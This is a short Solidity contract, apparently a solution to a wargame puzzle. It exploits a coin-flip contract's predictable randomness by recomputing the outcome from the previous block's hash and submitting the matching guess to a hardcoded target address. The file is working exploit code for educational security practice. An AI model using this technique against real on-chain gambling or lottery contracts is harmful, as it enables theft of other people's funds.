//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    address public CoinFlipContract = 0x558c603bF5097bdf13f850C58D98EbB7417bA484;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    function attackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool guess = coinFlip == 1;
        ICoinFlip(CoinFlipContract).flip(guess);

    }

}